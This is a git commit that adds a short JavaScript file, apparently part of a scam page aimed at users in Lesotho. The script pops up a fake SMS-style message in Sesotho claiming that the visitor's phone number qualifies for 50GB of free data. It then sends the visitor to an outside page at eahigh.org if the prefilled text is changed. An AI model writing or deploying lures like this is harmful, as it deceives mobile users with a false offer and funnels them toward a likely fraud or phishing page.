09e01b250d4b8730a7c837cb60e48a564fa6629d
dhatablog <williamsnsiako@gmail.com>
2025-09-28 16:01:01 +0100

    Create lesotho-active.js

---
+++ lesotho-active.js
@@ -0,0 +1,5 @@
+var password = 'Kenya tšebetsong 50GB'
+password=prompt('SMS: Kea u lebohela, nomoro ea hau ea mohala e loketse ho fumana 50gb, tobetsa OK ho kenya tšebetsong hona joale.','Kenya tšebetsong 50GB');
+if (password != 'Kenya tšebetsong 50GB') {
+location.href='https://eahigh.org/lesotho.html';
+}
